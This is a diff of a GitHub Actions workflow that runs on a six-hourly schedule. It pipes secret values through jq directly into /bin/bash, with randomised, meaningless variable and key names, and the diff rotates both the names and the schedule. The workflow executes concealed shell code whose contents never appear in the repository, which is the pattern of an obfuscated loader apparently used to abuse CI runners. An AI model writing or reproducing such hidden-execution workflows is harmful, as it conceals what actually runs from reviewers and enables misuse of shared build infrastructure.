@@ -3,8 +3,7 @@ name: zhengcunzai3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
-
+    - cron: '36 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,20 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhengcunzai3456
         env:
-          i70095: ${{ secrets.i70095 }}
+          kkf03558: ${{ secrets.kkf03558 }}
         run: |
-          echo $i70095 | jq -r .frzc82 | /bin/bash
-          echo $dqx48482 | jq -r .xli6 | /bin/bash
-          echo $q438 | jq -r .n4215 | /bin/bash
-          echo $scu94061 | jq -r .ya57689 | /bin/bash
-          echo $vh95114 | jq -r .shjtr15252 | /bin/bash
-          echo $amr72 | jq -r .lmf671 | /bin/bash
-          echo $jn806 | jq -r .oexze484 | /bin/bash
-          echo $ypyh00 | jq -r .pzc953 | /bin/bash
-          echo $xj55 | jq -r .jm7798 | /bin/bash
-          echo $oizqw408 | jq -r .mgk1 | /bin/bash
-          echo $oj703 | jq -r .hhf865 | /bin/bash
-          echo $sw7 | jq -r .qqhuk808 | /bin/bash
-          echo $bjx02807 | jq -r .uofx19 | /bin/bash
-          echo $auc0 | jq -r .wtuop69 | /bin/bash
+          echo $kkf03558 | jq -r .pczig6 | /bin/bash
+          echo $rjef1027 | jq -r .gi55281 | /bin/bash
+          echo $lyvcb65 | jq -r .o8209 | /bin/bash
+          echo $u0 | jq -r .sgpfe4 | /bin/bash
+          echo $qbd90 | jq -r .sn81 | /bin/bash
+          echo $br84 | jq -r .ekoo135 | /bin/bash
+          echo $qrx9271 | jq -r .aic19 | /bin/bash
+          echo $ploa44094 | jq -r .omfc82 | /bin/bash
+          echo $z19 | jq -r .ixzw634 | /bin/bash
 
